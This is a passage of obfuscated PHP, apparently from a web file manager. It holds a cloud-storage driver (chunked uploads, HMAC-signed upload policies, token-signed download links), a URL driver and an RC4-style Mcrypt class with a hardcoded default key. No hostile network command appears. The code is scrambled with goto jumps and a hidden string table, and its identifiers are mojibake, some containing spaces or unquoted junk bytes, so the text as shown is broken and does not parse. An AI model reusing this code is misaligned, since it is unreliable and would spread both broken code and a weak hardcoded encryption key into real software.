$aŒÖ¿°Êºø[33]; $Dê™Øùğ— = isset($C”’µ¯…â¹[$aŒÖ¿°Êºø[1271]]) ? $C”’µ¯…â¹[$aŒÖ¿°Êºø[1271]] : array(); if (empty($Dê™Øùğ—)) { break; } $d±²æ°À¼ï = array_to_keyvalue($Dê™Øùğ—, $aŒÖ¿°Êºø[33], $aŒÖ¿°Êºø[29]); $E®ÜÏ¬•‰ = array_count_values($d±²æ°À¼ï); $fĞ½‡øšˆ = isset($E®ÜÏ¬•‰[$aŒÖ¿°Êºø[76]]) ? $E®ÜÏ¬•‰[$aŒÖ¿°Êºø[76]] : 0; $c“«ÀàòïÆ = count($d±²æ°À¼ï) - $fĞ½‡øšˆ; if ($b±œëÀ°İ‘) { $d…›¾×Öõ += $fĞ½‡øšˆ; $fø–öˆİ´” += $c“«ÀàòïÆ; if ($A´·“ÊÌ < $D¾è«Æ¯²Ÿ) { break; } continue; } if ($e¹ˆÀ“®„à) { if ($c“«ÀàòïÆ) { return !0; } } else { if ($fĞ½‡øšˆ) { return !0; } } if (count($Dê™Øùğ—) < $D¾è«Æ¯²Ÿ) { break; } } if ($b±œëÀ°İ‘) { return array($aŒÖ¿°Êºø[195] => $fø–öˆİ´”, $aŒÖ¿°Êºø[196] => $d…›¾×Öõ); } return !1; goto dêÄƒ¨Â‹; dêÄƒ¨Â‹: } public function listAll($a½ê‘Òã›Â) { $Dä««§ãó­ = array(); $this->recursionAllFiles($a½ê‘Òã›Â, $Dä««§ãó­); return $Dä««§ãó­; } public function canRead($DËØãò‚¤ë) { return $this->exist($DËØãò‚¤ë) ? !0 : !1; } public function canWrite($fÇ‡é¤½æ…) { return $this->exist($fÇ‡é¤½æ…) ? !0 : !1; } public function getContent($B‚å—ÒÕ) { return $this->fileSubstr($B‚å—ÒÕ, 0, -1); } public function setContent($fÌ…®ºğŞÁ, $E‡â—í÷âÊ = '') { $E—º«Ô…« =& $_SERVER[…Ò×–]; if (!$E‡â—í÷âÊ) { $F‰¬ÕÖÖ ¯ = $this->ussRequest($fÌ…®ºğŞÁ, $E—º«Ô…«[216]); return $F‰¬ÕÖÖ ¯[$E—º«Ô…«[1043]]; } $Dˆõ²ø‹ÛÑ = $this->tempFile($this->pathThis($fÌ…®ºğŞÁ)); file_put_contents($Dˆõ²ø‹ÛÑ, $E‡â—í÷âÊ); if ($this->upload($fÌ…®ºğŞÁ, $Dˆõ²ø‹ÛÑ)) { $this->tempFileRemve($Dˆõ²ø‹ÛÑ); return !0; } return !1; } public function fileSubstr($BË¿«—×‹´, $aƒİ›‚§ó‘, $B¹ò¾ò¯‚) { $aƒÊ²±©Ãè =& $_SERVER[…Ò×–]; if (!($a„¨áŞ½¹ğ = $this->link($BË¿«—×‹´))) { return !1; } $FÓ¨ñÙË¹ = !1; if ($B¹ò¾ò¯‚ > 0) { $EÎŸîçŠÈÊ = $aƒİ›‚§ó‘ + $B¹ò¾ò¯‚ - 1; $FÓ¨ñÙË¹ = array($aƒÊ²±©Ãè[1232] . $aƒİ›‚§ó‘ . $aƒÊ²±©Ãè[416] . $EÎŸîçŠÈÊ); } $AÛ§ïñÒâ = url_request($a„¨áŞ½¹ğ, $aƒÊ²±©Ãè[220], !1, $FÓ¨ñÙË¹); return $AÛ§ïñÒâ[$aƒÊ²±©Ãè[694]] ? $AÛ§ïñÒâ[$aƒÊ²±©Ãè[1045]] : !1; } public function upload($fİ¿ùªÜãğ, $Dé¯ìéùš², $FÓÁ‚‚ˆ™’ = false, $cÉ¼…Ë‰† = REPEAT_REPLACE) { goto D¶²Ù«±†œ; D¶²Ù«±†œ: $aä®Ğäù³¥ =& $_SERVER[…Ò×–]; $D¦‹Ÿßö·· = IO::size($Dé¯ìéùš²); if ($D¦‹Ÿßö·· <= 1024 * 1024 * 200) { $EÚìãÄáñœ = array($aä®Ğäù³¥[1272] . $Dé¯ìéùš²); $dŸ•œ‚‹‘ = $this->ussRequest($fİ¿ùªÜãğ, $aä®Ğäù³¥[218], $EÚìãÄáñœ); return $dŸ•œ‚‹‘[$aä®Ğäù³¥[1043]] ? $this->getPathOuter($fİ¿ùªÜãğ) : !1; } goto aï°æ’‡Àİ; f¥¢œõ©¢Ü: if (!$dŸ•œ‚‹‘[$aä®Ğäù³¥[1043]]) { return !1; } $FÏŒ¤¸î®» = $dŸ•œ‚‹‘[$aä®Ğäù³¥[1045]]; $AÊ¶’Ü¦¹‹ = 0; goto C°¶ÄŸç²; C°¶ÄŸç²: $b»‹áãºÏ = $FÏŒ¤¸î®»[$aä®Ğäù³¥[1277]]; $aİ—îø¼¡ = fopen($Dé¯ìéùš², $aä®Ğäù³¥[1182]); if (!$aİ—îø¼¡) { return !1; } goto A“­Õ”Íêõ; aï°æ’‡Àİ: $Eß…Õ¡œ = 1024 * 1024 * 10; $f—‚ „Ğ§© = array($aä®Ğäù³¥[1273], $aä®Ğäù³¥[1274] . $D¦‹Ÿßö··, $aä®Ğäù³¥[1275], $aä®Ğäù³¥[1276] . $Eß…Õ¡œ); $dŸ•œ‚‹‘ = $this->ussRequest($fİ¿ùªÜãğ, $aä®Ğäù³¥[218], !1, $f—‚ „Ğ§©); goto f¥¢œõ©¢Ü; A“­Õ”Íêõ: do { $CÍö¢Æ¬Â = $FÏŒ¤¸î®»[$aä®Ğäù³¥[1278]]; fseek_64($aİ—îø¼¡, $AÊ¶’Ü¦¹‹); $EìÈÉ‚Û¸‰ = fread($aİ—îø¼¡, $CÍö¢Æ¬Â); $Då—Ù™›Í£ = 0; do { $Då—Ù™›Í£++; $FÏŒ¤¸î®» = $this->uploadPart($fİ¿ùªÜãğ, $FÏŒ¤¸î®», $EìÈÉ‚Û¸‰); } while (!$FÏŒ¤¸î®» && $Då—Ù™›Í£ < 3); if (!$FÏŒ¤¸î®») { return !1; } $b»‹áãºÏ = $FÏŒ¤¸î®»[$aä®Ğäù³¥[1277]]; $AÊ¶’Ü¦¹‹ += $CÍö¢Æ¬Â; } while ($b»‹áãºÏ != -1); fclose($aİ—îø¼¡); $f—‚ „Ğ§© = array($aä®Ğäù³¥[1279], $aä®Ğäù³¥[1280] . $FÏŒ¤¸î®»[$aä®Ğäù³¥[1281]], $aä®Ğäù³¥[1275]); goto b‹²¨½»Ïª; b‹²¨½»Ïª: $dŸ•œ‚‹‘ = $this->ussRequest($fİ¿ùªÜãğ, $aä®Ğäù³¥[218], !1, $f—‚ „Ğ§©); return $dŸ•œ‚‹‘[$aä®Ğäù³¥[1043]] ? $this->getPathOuter($B­ãÆà¦Û) : !1; goto d“‹ÂÔ½öÃ; d“‹ÂÔ½öÃ: } private function uploadPart($fß¤‚ÖË¾ğ, $CÅÏÂ×éÁ¦, &$DéŸË°Úó¥) { $F‚ª‡«ØÖ =& $_SERVER[…Ò×–]; $e¤Ş¯áÂß« = array($F‚ª‡«ØÖ[1282], $F‚ª‡«ØÖ[1280] . $CÅÏÂ×éÁ¦[$F‚ª‡«ØÖ[1281]], $F‚ª‡«ØÖ[1283] . $CÅÏÂ×éÁ¦[$F‚ª‡«ØÖ[1277]], $F‚ª‡«ØÖ[138] . $CÅÏÂ×éÁ¦[$F‚ª‡«ØÖ[1278]]); $a¯Ñ¾„ = $this->ussRequest($fß¤‚ÖË¾ğ, $F‚ª‡«ØÖ[218], $DéŸË°Úó¥, $e¤Ş¯áÂß«); return !$a¯Ñ¾„[$F‚ª‡«ØÖ[1043]] ? $a¯Ñ¾„[$F‚ª‡«ØÖ[1043]] : $a¯Ñ¾„[$F‚ª‡«ØÖ[1045]]; } public function uploadFormData($E³à¶•ŸÈŒ, $BŒŠ¥î¢ÓĞ = 3600) { return $this->uploadPolicy($E³à¶•ŸÈŒ, $BŒŠ¥î¢ÓĞ); } public function multiUploadFormData($B¹Üñ‰‘Ô, $EêÂ›¡Æ = 3600) { $cÌ¾ºÇ”¡Ú =& $_SERVER[…Ò×–]; $BÚ§”øàîÁ = (int) $GLOBALS[$cÌ¾ºÇ”¡Ú[7]][$cÌ¾ºÇ”¡Ú[77]]; return $this->uploadPolicy($B¹Üñ‰‘Ô, $EêÂ›¡Æ, $BÚ§”øàîÁ); } private function uploadPolicy($EâŒº¨ÂÓ‚, $A½ğËšËë  = 3600, $B‰‡¾²•’å = 0) { goto B¢—´Ñ—; C×Ø‡æ§: $bÉÒŒƒØËÈ = array($CÒæëœšÒ[1284] => $this->bucket, $CÒæëœšÒ[1285] => $EâŒº¨ÂÓ‚, $CÒæëœšÒ[1286] => time() + $A½ğËšËë , $CÒæëœšÒ[1287] => $f­Éä½¹ÄÉ); if ($B‰‡¾²•’å) { $bÉÒŒƒØËÈ[$CÒæëœšÒ[1204]] = $B‰‡¾²•’å; } $B¬…Î©Œ©• = base64_encode(json_encode($bÉÒŒƒØËÈ)); goto fÏÃÒÄ œÍ; fÏÃÒÄ œÍ: $a°È›•½Ì¹ = base64_encode(hash_hmac($CÒæëœšÒ[1254], "\120\117\x53\124\46{$Fö†Â±Â}\x26{$f­Éä½¹ÄÉ}\46{$B¬…Î©Œ©•}", md5("{$this->userpass}"), !0)); $bÚ†¤¢øíô = array($CÒæëœšÒ[1122] => $B¬…Î©Œ©•, $CÒæëœšÒ[1288] => "\125\x50\x59\125\x4e\40{$this->username}\x3a{$a°È›•½Ì¹}", $CÒæëœšÒ[173] => $this->endpoint . $Fö†Â±Â); return $bÚ†¤¢øíô; goto D±µÂÚäåˆ; B¢—´Ñ—: $CÒæëœšÒ =& $_SERVER[…Ò×–]; $Fö†Â±Â = $CÒæëœšÒ[8] . $this->bucket; $f­Éä½¹ÄÉ = gmdate($CÒæëœšÒ[1218]); goto C×Ø‡æ§; D±µÂÚäåˆ: } public function download($fœ¦Ùì, $A¨Ùì°§ñØ) { goto DÊÆ’Ğ‚´¯; BÏè•ˆÑ¡: $FÖ®ĞèˆÌ = 1024 * 200; $a·Ã¾‰Î†ç = fopen($f”Øí£ˆ£ì, $_SERVER[…Ò×–][1238]); while (!0) { $D¾ˆÕØª¤‡ = $this->fileSubstr($fœ¦Ùì, $aĞ‘åğ, $FÖ®ĞèˆÌ); if ($D¾ˆÕØª¤‡ === !1) { return !1; } fwrite($a·Ã¾‰Î†ç, $D¾ˆÕØª¤‡); $aĞ‘åğ += $FÖ®ĞèˆÌ; if (strlen($D¾ˆÕØª¤‡) < $FÖ®ĞèˆÌ) { break; } } goto cãõËË¼Ø; DÊÆ’Ğ‚´¯: $f”Øí£ˆ£ì = IO::getPathInner(IO::mkfile($A¨Ùì°§ñØ)); if (!($bÓ¯¹¡Ôã” = $this->link($fœ¦Ùì))) { return !1; } $aĞ‘åğ = 0; goto BÏè•ˆÑ¡; cãõËË¼Ø: fclose($a·Ã¾‰Î†ç); return $A¨Ùì°§ñØ; goto B‹¼ÈìãË; B‹¼ÈìãË: } public function link($E¿äŞßìµö, $DÃ†ªÚ±Ü¯ = array()) { $dÇ¾¡­Òï =& $_SERVER[…Ò×–]; $E¿äŞßìµö = trim($E¿äŞßìµö, $dÇ¾¡­Òï[8]); if (!empty($this->token)) { $cÕéêÌÂ = strtotime(date($dÇ¾¡­Òï[1289])); $a±ğ“ÀÉè = substr(md5($this->token . $dÇ¾¡­Òï[276] . $cÕéêÌÂ . $dÇ¾¡­Òï[1290] . $E¿äŞßìµö), 12, 8) . $cÕéêÌÂ; $DÃ†ªÚ±Ü¯[] = $dÇ¾¡­Òï[1291] . $a±ğ“ÀÉè; } $D¿ˆòˆãÎ‰ = !empty($DÃ†ªÚ±Ü¯) ? $dÇ¾¡­Òï[69] . implode($dÇ¾¡­Òï[276], $DÃ†ªÚ±Ü¯) : $dÇ¾¡­Òï[33]; return $this->getHost() . $dÇ¾¡­Òï[8] . $E¿äŞßìµö . $D¿ˆòˆãÎ‰; } public function fileOut($d…Ò™‚••Ó, $dæˆ¨÷øØ = false, $d¹Î—±Ìº = false, $d²ÌÖ¸”Ä = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($d…Ò™‚••Ó, $dæˆ¨÷øØ, $d¹Î—±Ìº, $d²ÌÖ¸”Ä); } if (!$d¹Î—±Ìº) { $d¹Î—±Ìº = $this->pathThis($d…Ò™‚••Ó); } $D›¥„áÌŞˆ = $dæˆ¨÷øØ ? array($_SERVER[…Ò×–][1292] . rawurlencode($d¹Î—±Ìº)) : array(); $b÷‘¥‰ÒøÑ = $this->link($d…Ò™‚••Ó, $D›¥„áÌŞˆ); $this->fileOutLink($b÷‘¥‰ÒøÑ); } public function fileOutServer($f–¨«Ùéß, $FîõòÉÓË˜ = false, $cßµõíÕ†‘ = false, $D‡èˆ‰Äˆ = '') { parent::fileOut($f–¨«Ùéß, $FîõòÉÓË˜, $cßµõíÕ†‘, $D‡èˆ‰Äˆ); } public function fileOutImage($Få’”¿ãŒ, $eË¾ÛàØ±â = 250) { $F­ëØê—¹ = $this->link($Få’”¿ãŒ . $_SERVER[…Ò×–][1293] . $eË¾ÛàØ±â); $this->fileOutLink($F­ëØê—¹); } public function fileOutImageServer($Cäœ´—©, $B×¬‡ÁïÏ— = 250) { parent::fileOutImage($Cäœ´—©, $B×¬‡ÁïÏ—); } public function hashMd5($EùñÑ‡Ş…´) { $bÏÉÒ•ˆœ† =& $_SERVER[…Ò×–]; $C‚ •£º½œ = $this->objectMeta($EùñÑ‡Ş…´); return isset($C‚ •£º½œ[$bÏÉÒ•ˆœ†[200]]) ? $C‚ •£º½œ[$bÏÉÒ•ˆœ†[200]] : !1; } public function size($E—Ÿ£õ´) { $CåßÖ‹µ¬ƒ = $this->objectMeta($E—Ÿ£õ´); return $CåßÖ‹µ¬ƒ ? $CåßÖ‹µ¬ƒ[$_SERVER[…Ò×–][77]] : 0; } public function info($D©Ó‰§²ò) { if ($this->isFolder($D©Ó‰§²ò)) { return $this->folderInfo($D©Ó‰§²ò); } else { if ($this->isFile($D©Ó‰§²ò)) { return $this->fileInfo($D©Ó‰§²ò); } } return !1; } public function exist($bø§Õ£êÈ“) { return $this->isFile($bø§Õ£êÈ“) || $this->isFolder($bø§Õ£êÈ“); } public function isFile($c“ƒ×õ’) { return !$this->isFolder($c“ƒ×õ’) && $this->objectMeta($c“ƒ×õ’); } public function isFolder($aºâÛòÇÂß) { return $this->cacheMethod($_SERVER[…Ò×–][227], $aºâÛòÇÂß); } protected function objectMeta($aºóÙŒİÓ) { return $this->cacheMethod($_SERVER[…Ò×–][228], $aºóÙŒİÓ); } protected function _objectMeta($CÊ„é¨Öîß) { goto DÊœ¾ß; DÊœ¾ß: $D¥ØÒ¿ìÍ =& $_SERVER[…Ò×–]; if ($CÊ„é¨Öîß == $D¥ØÒ¿ìÍ[33] || $CÊ„é¨Öîß == $D¥ØÒ¿ìÍ[8]) { return array(); } $F­Àƒ¶Ç˜Ğ = $this->ussRequest($CÊ„é¨Öîß, $D¥ØÒ¿ìÍ[1294]); goto F“‡¢¯“‚; E÷ä³÷Ñ®Û: $b”¹äİ¹šÒ = array($D¥ØÒ¿ìÍ[28] => get_path_this($CÊ„é¨Öîß), $D¥ØÒ¿ìÍ[29] => isset($F«¸Š´È†[$D¥ØÒ¿ìÍ[1295]]) ? $F«¸Š´È†[$D¥ØÒ¿ìÍ[1295]] : null, $D¥ØÒ¿ìÍ[77] => isset($F«¸Š´È†[$D¥ØÒ¿ìÍ[1296]]) ? $F«¸Š´È†[$D¥ØÒ¿ìÍ[1296]] : null, $D¥ØÒ¿ìÍ[200] => isset($F«¸Š´È†[$D¥ØÒ¿ìÍ[1297]]) ? $F«¸Š´È†[$D¥ØÒ¿ìÍ[1297]] : null, $D¥ØÒ¿ìÍ[1265] => isset($F«¸Š´È†[$D¥ØÒ¿ìÍ[1298]]) ? $F«¸Š´È†[$D¥ØÒ¿ìÍ[1298]] : null); $b”¹äİ¹šÒ[$D¥ØÒ¿ìÍ[1266]] = isset($F«¸Š´È†[$D¥ØÒ¿ìÍ[1299]]) ? strtotime($F«¸Š´È†[$D¥ØÒ¿ìÍ[1299]]) : $b”¹äİ¹šÒ[$D¥ØÒ¿ìÍ[1265]]; return $b”¹äİ¹šÒ; goto d¥õòò¸¤°; F“‡¢¯“‚: if (!$F­Àƒ¶Ç˜Ğ[$D¥ØÒ¿ìÍ[1043]]) { return null; } $F«¸Š´È† = isset($F­Àƒ¶Ç˜Ğ[$D¥ØÒ¿ìÍ[1045]]) ? $F­Àƒ¶Ç˜Ğ[$D¥ØÒ¿ìÍ[1045]] : array(); if (!isset($F«¸Š´È†[$D¥ØÒ¿ìÍ[1295]])) { return null; } goto E÷ä³÷Ñ®Û; d¥õòò¸¤°: } protected function _isFolder($Cœ¡Ó±ƒİİ) { $e™´—»…ºœ =& $_SERVER[…Ò×–]; if ($Cœ¡Ó±ƒİİ == $e™´—»…ºœ[33] || $Cœ¡Ó±ƒİİ == $e™´—»…ºœ[8]) { return !0; } $b¸ÚÖêèÊå = $this->objectMeta($Cœ¡Ó±ƒİİ); return isset($b¸ÚÖêèÊå[$e™´—»…ºœ[29]]) && $b¸ÚÖêèÊå[$e™´—»…ºœ[29]] == $e™´—»…ºœ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($E†…¹ÓÓ„ = false) { } public function exist($c¤Úè¿Åğ) { $BÄêœµŠç® = $this->info($c¤Úè¿Åğ); return $BÄêœµŠç®[$_SERVER[…Ò×–][192]]; } public function isFile($A™ÎäÀšÓ°) { $b¦‘’—øà° = $this->info($A™ÎäÀšÓ°); return $b¦‘’—øà°[$_SERVER[…Ò×–][192]]; } public function isFolder($FâßŠù»”š) { return !1; } public function size($c±¤ÙËŠê³) { $E¶‚âä°ƒˆ = $this->info($c±¤ÙËŠê³); return $E¶‚âä°ƒˆ[$_SERVER[…Ò×–][77]]; } public function info($D­„–Í¸) { return $this->infoParse($D­„–Í¸); } public function infoAuth($a§Äâ˜‡È‹) { return $this->infoParse($a§Äâ˜‡È‹); } public function infoWithChildren($fÄ‰Ó¥š±) { return $this->infoParse($fÄ‰Ó¥š±); } public function infoFull($C¨ÀãˆÇ†°) { return $this->infoParse($C¨ÀãˆÇ†°); } private function infoParse($B¦¥Ç†ÂÙ) { $eË¦„Íµ ± =& $_SERVER[…Ò×–]; $aÌ¾éä Ó = $this->header($B¦¥Ç†ÂÙ); if (!$aÌ¾éä Ó || !$aÌ¾éä Ó[$eË¦„Íµ ±[694]]) { return !1; } $FóŸ£ÇíºÁ = _get($aÌ¾éä Ó, $eË¦„Íµ ±[329], 0); $F‡ã¤¤æ¨Ì = array($eË¦„Íµ ±[28] => $aÌ¾éä Ó[$eË¦„Íµ ±[28]], $eË¦„Íµ ±[75] => $B¦¥Ç†ÂÙ, $eË¦„Íµ ±[29] => $eË¦„Íµ ±[171], $eË¦„Íµ ±[77] => intval($FóŸ£ÇíºÁ), $eË¦„Íµ ±[165] => get_path_ext($aÌ¾éä Ó[$eË¦„Íµ ±[28]]), $eË¦„Íµ ±[1175] => $FóŸ£ÇíºÁ > 0 && $aÌ¾éä Ó[$eË¦„Íµ ±[1300]], $eË¦„Íµ ±[1176] => !1); return $F‡ã¤¤æ¨Ì; } private function header($CŒŠŸÉäµÊ) { if (isset(self::$_cacheHeader[$CŒŠŸÉäµÊ])) { return self::$_cacheHeader[$CŒŠŸÉäµÊ]; } self::$_cacheHeader[$CŒŠŸÉäµÊ] = url_header($CŒŠŸÉäµÊ); return self::$_cacheHeader[$CŒŠŸÉäµÊ]; } public function hashSimple($A»ğãç°Ì, $A¶æ’ÕçÌÙ = false) { goto d³øëêØ¬; Fæ‘ù™Á„Ò: $D¼Ãø”‚¸ = $BÄöÏÂ÷·»[$bÍ­•µ[77]]; $AÂËÃ­Úù = 200; $C¤Í‡‚È®Ÿ = 50; goto féß¦®½àˆ; eÃÊ„Å­ä: $a¸†Ò™Æ‘ˆ .= $this->fileSubstr($A»ğãç°Ì, $D¼Ãø”‚¸ - $AÂËÃ­Úù, $AÂËÃ­Úù); return md5($a¸†Ò™Æ‘ˆ) . $D¼Ãø”‚¸; goto a ²ªòÍÊ; B¹÷é£áÒ: $a¦é„—¢À¼ = timeFloat(); $bÄÒ‘“¹• = 15; for ($a‚ÊÉÇ½†× = 0; $a‚ÊÉÇ½†× < $C¤Í‡‚È®Ÿ; $a‚ÊÉÇ½†×++) { if (timeFloat() - $a¦é„—¢À¼ > $bÄÒ‘“¹•) { return !1; } $b­¯Š÷·ï = $this->fileSubstr($A»ğãç°Ì, $c¶‘„œÉ´İ * $a‚ÊÉÇ½†×, $AÂËÃ­Úù); if (!$b­¯Š÷·ï) { return !1; } $a¸†Ò™Æ‘ˆ .= $b­¯Š÷·ï; } goto eÃÊ„Å­ä; d³øëêØ¬: $bÍ­•µ =& $_SERVER[…Ò×–]; $BÄöÏÂ÷·» = $this->info($A»ğãç°Ì); if (!$BÄöÏÂ÷·» || !$BÄöÏÂ÷·»[$bÍ­•µ[192]]) { return !1; } goto Fæ‘ù™Á„Ò; féß¦®½àˆ: if ($D¼Ãø”‚¸ <= $AÂËÃ­Úù * $C¤Í‡‚È®Ÿ) { return md5($this->fileSubstr($A»ğãç°Ì, 0, $D¼Ãø”‚¸)) . $D¼Ãø”‚¸; } $c¶‘„œÉ´İ = intval($D¼Ãø”‚¸ / $C¤Í‡‚È®Ÿ); $a¸†Ò™Æ‘ˆ = $bÍ­•µ[33]; goto B¹÷é£áÒ; a ²ªòÍÊ: } public function getContent($cã´³‡•Œ) { return $this->fileSubstr($cã´³‡•Œ); } public function fileSubstr($C‘ÉìˆøÚÍ, $aËàæõ—“ï = 0, $Dƒ˜¯±Éï¯ = -1) { goto d¤ º“¯²·; fÀ’©Ø’ÂÜ: if ($Dƒ˜¯±Éï¯ === -1) { $Dƒ˜¯±Éï¯ = $b‚ª¢³¡Ğ[$f¾‡´ğàº[77]]; } if ($Dƒ˜¯±Éï¯ == 0) { return $f¾‡´ğàº[33]; } $f„ì÷Œ¢ğ£ = array($f¾‡´ğàº[1301] . $aËàæõ—“ï . $f¾‡´ğàº[720] . ($aËàæõ—“ï + $Dƒ˜¯±Éï¯ - 1)); goto B„ÆË±²§; d¤ º“¯²·: $f¾‡´ğàº =& $_SERVER[…Ò×–]; $b‚ª¢³¡Ğ = $this->info($C‘ÉìˆøÚÍ); if (!$b‚ª¢³¡Ğ || !$b‚ª¢³¡Ğ[$f¾‡´ğàº[192]] && $b‚ª¢³¡Ğ[$f¾‡´ğàº[77]] > 1024 * 1024 * 10) { return !1; } goto fÀ’©Ø’ÂÜ; B„ÆË±²§: $FÒÖÜù¶«ˆ = url_request($C‘ÉìˆøÚÍ, $f¾‡´ğàº[220], !1, $f„ì÷Œ¢ğ£, !1, !1, 1); return $FÒÖÜù¶«ˆ[$f¾‡´ğàº[1045]] ? $FÒÖÜù¶«ˆ[$f¾‡´ğàº[1045]] : $f¾‡´ğàº[33]; goto E¦äÇ­¿; E¦äÇ­¿: } public function download($CŸÙ®²öË, $b¸õâÄ†ö) { Downloader::start($CŸÙ®²öË, $b¸õâÄ†ö); return $b¸õâÄ†ö; } } goto aĞ¶¦ÈïÎÏ; Fï¶µ‰¤Á: class Mcrypt { public static $defaultKey = "\x61\x21\x74\x61\x6b\x41\72\x64\x6c\155\143\x6c\x64\105\x76\54\x65"; public static function encode($E ™ÅÖµµ“, $c äî—ù“ = '', $AË¸‡›Ùí¤ = 0, $c“µâ«î› = '') { goto c‘Ûë¿•Úø; E¯…ªšã´ã: $DÌ—òôÕëª = str_replace(array($Fºóƒï¡Ù[288], $Fºóƒï¡Ù[8], $Fºóƒï¡Ù[913]), array($Fºóƒï¡Ù[416], $Fºóƒï¡Ù[70], $Fºóƒï¡Ù[91]), $DÌ—òôÕëª); return $DÌ—òôÕëª; goto D‰æ§Ú©«§; cÈÀÕÌùÎ: $FñÂ³ğâ³” = md5(substr($c äî—ù“, 0, 16)); $CÕ½¥·½Ë = md5(substr($c äî—ù“, 16, 16)); $c“µâ«î› = $c“µâ«î› ? $c“µâ«î› : md5(microtime()); goto b¢ŞÃ»Œçö; D›ÛêˆØŒÕ: for ($B¶±¹ê¸ºœ = 0; $B¶±¹ê¸ºœ <= 255; $B¶±¹ê¸ºœ++) { $EÊŠªÒŞÈÇ[$B¶±¹ê¸ºœ] = ord($c¡‘ÕÍ©„½[$B¶±¹ê¸ºœ % $Eº¥§–ÆÍ¶]); } $A»¦è¤£º¿ = range(0, 255); for ($A„è÷Ê„‡Œ = $B¶±¹ê¸ºœ = 0; $B¶±¹ê¸ºœ < 256; $B¶±¹ê¸ºœ++) { $A„è÷Ê„‡Œ = ($A„è÷Ê„‡Œ + $A»¦è¤£º¿[$B¶±¹ê¸ºœ] + $EÊŠªÒŞÈÇ[$B¶±¹ê¸ºœ]) % 256; $dğ´õ’¿à = $A»¦è¤£º¿[$B¶±¹ê¸ºœ]; $A»¦è¤£º¿[$B¶±¹ê¸ºœ] = $A»¦è¤£º¿[$A„è÷Ê„‡Œ]; $A»¦è¤£º¿[$A„è÷Ê„‡Œ] = $dğ´õ’¿à; } goto C®ˆ ‹Šó¦; C®ˆ ‹Šó¦: $DÌ—òôÕëª = $Fºóƒï¡Ù[33]; for ($bº‡îç¿Àë = $A„è÷Ê„‡Œ = $B¶±¹ê¸ºœ = 0; $B¶±¹ê¸ºœ < $F¤¨ğóĞ; $B¶±¹ê¸ºœ++) { $bº‡îç¿Àë = ($bº‡îç¿Àë + 1) % 256; $A„è÷Ê„‡Œ = ($A„è÷Ê„‡Œ + $A»¦è¤£º¿[$bº‡îç¿Àë]) % 256; $dğ´õ’¿à = $A»¦è¤£º¿[$bº‡îç¿Àë]; $A»¦è¤£º¿[$bº‡îç¿Àë] = $A»¦è¤£º¿[$A„è÷Ê„‡Œ]; $A»¦è¤£º¿[$A„è÷Ê„‡Œ] = $dğ´õ’¿à; $DÌ—òôÕëª .= chr(ord($E ™ÅÖµµ“[$B¶±¹ê¸ºœ]) ^ $A»¦è¤£º¿[($A»¦è¤£º¿[$bº‡îç¿Àë] + $A»¦è¤£º¿[$A„è÷Ê„‡Œ]) % 256]); } $DÌ—òôÕëª = $C»÷á¸—˜ô . str_replace($Fºóƒï¡Ù[913], $Fºóƒï¡Ù[33], base64_encode($DÌ—òôÕëª)); goto E¯…ªšã´ã; dÜË‰½ÖÃ: $E ™ÅÖµµ“ = sprintf($Fºóƒï¡Ù[1945], $AË¸‡›Ùí¤ ? $AË¸‡›Ùí¤ + time() : 0) . substr(md5($E ™ÅÖµµ“ . $CÕ½¥·½Ë), 0, 16) . $E ™ÅÖµµ“; $F¤¨ğóĞ = strlen($E ™ÅÖµµ“); $EÊŠªÒŞÈÇ = array(); goto D›ÛêˆØŒÕ; c‘Ûë¿•Úø: $Fºóƒï¡Ù =& $_SERVER[…Ò×–]; $dµ°â‹«”ê = 4; $c äî—ù“ = md5($c äî—ù“ ? $c äî—ù“ : self::$defaultKey); goto cÈÀÕÌùÎ; b¢ŞÃ»Œçö: $C»÷á¸—˜ô = substr($c“µâ«î›, -$dµ°â‹«”ê); $c¡‘ÕÍ©„½ = $FñÂ³ğâ³” . md5($FñÂ³ğâ³” . $C»÷á¸—˜ô); $Eº¥§–ÆÍ¶ = strlen($c¡‘ÕÍ©„½); goto dÜË‰½ÖÃ; D‰æ§Ú©«§: } public static function decode($fõº«¶†Î, $AÚîíÄ¯ï© = '') { goto BÍŠØ‰éÄ¼; b«èáëã¦­: if (($A‘İÑÃ—ÁÔ == 0 || $A‘İÑÃ—ÁÔ - time() > 0) && substr($a¡ª¸öØ„, 10, 16) == substr(md5(substr($a¡ª¸öØ„, 26) . $b¿‚±é«Ç¤), 0, 16)) { return substr($a¡ª¸öØ„, 26); } else { return $Cè÷Œ²ñ…[33]; } goto EÁÁÕÑœæ; aìø‹÷©“©: $AÚîíÄ¯ï© = md5($AÚîíÄ¯ï© ? $AÚîíÄ¯ï© : self::$defaultKey); $F¹™À°ÛÜ = md5(substr($AÚîíÄ¯ï©, 0, 16)); $b¿‚±é«Ç¤ = md5(substr($AÚîíÄ¯ï©, 16, 16)); goto b™«õ¶îƒ; FïöÁ®Ï°Å: $a¡ª¸öØ„ = $Cè÷Œ²ñ…[33]; for ($Dí“øÇâ•ˆ = $AùòÛè°‰‰ = $F¥Í·Öì = 0; $F¥Í·Öì < $bªğ°¯Úòî; $F¥Í·Öì++) { $Dí“øÇâ•ˆ = ($Dí“øÇâ•ˆ + 1) % 256; $AùòÛè°‰‰ = ($AùòÛè°‰‰ + $cŠ½¨¥®™[$Dí“øÇâ•ˆ]) % 256; $fù—ºƒˆ¨¾ = $cŠ½¨¥®™[$Dí“øÇâ•ˆ]; $cŠ½¨¥®™[$Dí“øÇâ•ˆ] = $cŠ½¨¥®™[$AùòÛè°‰‰]; $cŠ½¨¥®™[$AùòÛè°‰‰] = $fù—ºƒˆ¨¾; $a¡ª¸öØ„ .= chr(ord($fõº«¶†Î[$F¥Í·Öì]) ^ $cŠ½¨¥®™[($cŠ½¨¥®™[$Dí“øÇâ•ˆ] + $cŠ½¨¥®™[$AùòÛè°‰‰]) % 256]); } $A‘İÑÃ—ÁÔ = intval(substr($a¡ª¸öØ„, 0, 10)); goto b«èáëã¦­; Dëğ…·¢±: for ($F¥Í·Öì = 0; $F¥Í·Öì <= 255; $F¥Í·Öì++) { $fæè¿ÔĞîø[$F¥Í·Öì] = ord($d­Æ§ÍŸï³[$F¥Í·Öì % $ağ¡º¾ñ“´]); } $cŠ½¨¥®™ = range(0, 255); for ($AùòÛè°‰‰ = $F¥Í·Öì = 0; $F¥Í·Öì < 256; $F¥Í·Öì++) { $AùòÛè°‰‰ = ($AùòÛè°‰‰ + $cŠ½¨¥®™[$F¥Í·Öì] + $fæè¿ÔĞîø[$F¥Í·Öì]) % 256; $fù—ºƒˆ¨¾ = 